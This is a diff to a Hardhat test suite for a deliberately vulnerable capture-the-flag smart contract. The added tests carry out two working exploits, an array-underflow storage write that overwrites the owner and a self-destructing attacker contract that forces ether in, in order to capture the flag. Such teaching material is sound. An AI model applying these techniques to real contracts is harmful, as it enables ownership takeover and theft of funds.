@@ -6,10 +6,10 @@ import type { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 describe('TotallySecureDapp', () => {
     let TotallySecureDapp;
     let totallySecureDapp: Contract;
-    let owner: SignerWithAddress, addr1: SignerWithAddress, addr2: SignerWithAddress;
+    let owner: SignerWithAddress, addr1: SignerWithAddress;
 
     beforeEach(async () => {
-        [owner, addr1, addr2] = await ethers.getSigners();
+        [owner, addr1] = await ethers.getSigners();
         TotallySecureDapp = await ethers.getContractFactory('TotallySecureDapp');
         totallySecureDapp = await TotallySecureDapp.deploy();
         await totallySecureDapp.deployed();
@@ -60,11 +60,17 @@ describe('TotallySecureDapp', () => {
     });
 
     it('Should only allow admins', async () => {
-        const revertReason = 'Caller is not the owner';
-        await expect(totallySecureDapp.captureFlag()).to.not.be.revertedWith(revertReason);
+        await expect(totallySecureDapp.captureFlag()).to.be.revertedWith('Balance too low');
         await expect(totallySecureDapp.connect(addr1).captureFlag()).to.be.revertedWith(
-            revertReason
+            'Caller is not the owner'
         );
+    });
+
+    it('Should reject payments', async () => {
+        const { parseEther } = ethers.utils;
+        await expect(
+            owner.sendTransaction({ to: totallySecureDapp.address, value: parseEther('1') })
+        ).to.be.revertedWith('Contract does not accept payments');
     });
 
     it('Should overwrite the owner admin', async () => {
@@ -85,15 +91,51 @@ describe('TotallySecureDapp', () => {
         await totallySecureDapp.connect(addr1).editPost(i, 'title', 'content');
         // Verify the overwrite has succeeded
         expect(await totallySecureDapp._owner()).to.equal(addr1.address);
-        expect(await owner.provider?.getStorageAt(totallySecureDapp.address, ownerSlot)).to.equal(
+        expect(await owner.provider!.getStorageAt(totallySecureDapp.address, ownerSlot)).to.equal(
             hexZeroPad(addr1.address, 32).toLowerCase()
         );
         // Try to run the owner only function
-        const revertReason = 'Caller is not the owner';
         await expect(totallySecureDapp.connect(addr1).captureFlag()).to.not.be.revertedWith(
-            revertReason
+            'Caller is not the owner'
         );
-        // Flag should be captured
+    });
+
+    it('Should take payment on attacker self-destruct', async () => {
+        const { parseEther } = ethers.utils;
+        const ethToSend = parseEther('1');
+        const Attacker = await ethers.getContractFactory('Attacker');
+        const attacker = await Attacker.deploy();
+        await attacker.deployed();
+        // TotallySecureDapp balance should be zero
+        expect(await owner.provider!.getBalance(totallySecureDapp.address)).to.equal(0);
+        // Send attacker ether and self-destruct, causing that ether to be sent to the TotallySecureDapp
+        await attacker.attack(totallySecureDapp.address, { value: ethToSend });
+        // TotallySecureDapp balance should now be 1
+        expect(await owner.provider!.getBalance(totallySecureDapp.address)).to.equal(ethToSend);
+    });
+
+    it('Should capture the flag', async () => {
+        const { solidityKeccak256, parseEther } = ethers.utils;
+        const { BigNumber } = ethers;
+        // First exploit - array length underflow - overwrite contract owner
+        const i = BigNumber.from(2)
+            .pow(256)
+            .sub(solidityKeccak256(['uint256'], [3]))
+            .add(2);
+        await totallySecureDapp.connect(addr1).removePost(0);
+        await totallySecureDapp.connect(addr1).editPost(i, '', '');
+        // Second exploit - forcibly send ether to contract - gain access to captureFlag()
+        const eth = parseEther('1');
+        const Attacker = await ethers.getContractFactory('Attacker');
+        const attacker = await Attacker.connect(addr1).deploy();
+        await attacker.connect(addr1).deployed();
+        await attacker.connect(addr1).attack(totallySecureDapp.address, { value: eth });
+        // Capture the flag
+        await expect(totallySecureDapp.connect(addr1).captureFlag())
+            .to.not.be.revertedWith('Caller is not the owner')
+            .and.to.not.be.revertedWith('Balance too low');
+        expect(await totallySecureDapp.connect(addr1)._owner()).to.equal(addr1.address);
         expect(await totallySecureDapp.connect(addr1)._flagCaptured()).to.equal(true);
+        expect(await addr1.provider!.getBalance(totallySecureDapp.address)).to.equal(eth);
     });
 });
